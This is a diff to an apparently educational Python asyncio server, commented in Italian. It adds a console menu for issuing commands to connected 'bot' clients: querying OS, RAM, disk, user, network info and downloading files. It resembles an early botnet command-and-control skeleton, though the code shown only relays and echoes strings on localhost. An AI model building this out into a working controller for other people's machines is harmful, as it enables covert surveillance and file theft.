@@ -5,6 +5,18 @@ from aioconsole import ainput  # Async console per asyncio
 
 HOST = "127.0.0.1"
 PORT = 9999
+__response_options = {1: "OS-TYPE", 2: "RAM", 3: "DISK", 4: "USER", 5: "STATUS", 6: "IO-CONNECTED", 7: "NETWORK-INFO", 8: "DOWNLOAD-FILE"}
+
+
+def print_menu(dictionary: dict, title: str, width=int) -> None:
+    """Menu di scelta per l'operazione da effettuare."""
+    north_box = f'╔{"═" * width}╗'  # upper_border
+    south_box = f'╚{"═" * width}╝'  # lower_border
+    print(north_box)
+    print(f"║ {title}")
+    for item in dictionary.keys():
+        print("║\t", item, '--', dictionary[item])
+    print(south_box)
 
 
 async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
@@ -14,13 +26,14 @@ async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.Stream
     # while request != b"quit":
     while response != stop_key.encode():  # Eseguiamo fin tanto che non riceviamo dal client "quit"
         response = await reader.read(1024)
-        # if response == b"":  # Se la response è vuota eseguiamo un comando da inviare al client che si tradurrà in una operazione
-        #     request = await ainput(">>>")  # TODO: al momento non la usiamo -> Punto ad aggiungere una serie di funzioni/cases per la richiesta da effettuare al client
+        if response == b"Operazione?":  # Se la response è vuota eseguiamo un comando da inviare al client che si tradurrà in una operazione
+            print_menu(__response_options, "Operazioni disponibili:", 32)
+            request = await ainput(">>>")  # TODO: al momento non la usiamo -> Punto ad aggiungere una serie di funzioni/cases per la richiesta da effettuare al client
+            writer.write(request.encode())
         msg = response.decode()
         addr, port = writer.get_extra_info("peername")
         print(f"Message from {addr}:{port}: {msg!r}")  # Sfruttiamo il Literal String Interpolation (F-String)
 
-        # writer.write(request.encode())
         writer.write(msg.encode())
         await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
     writer.close()
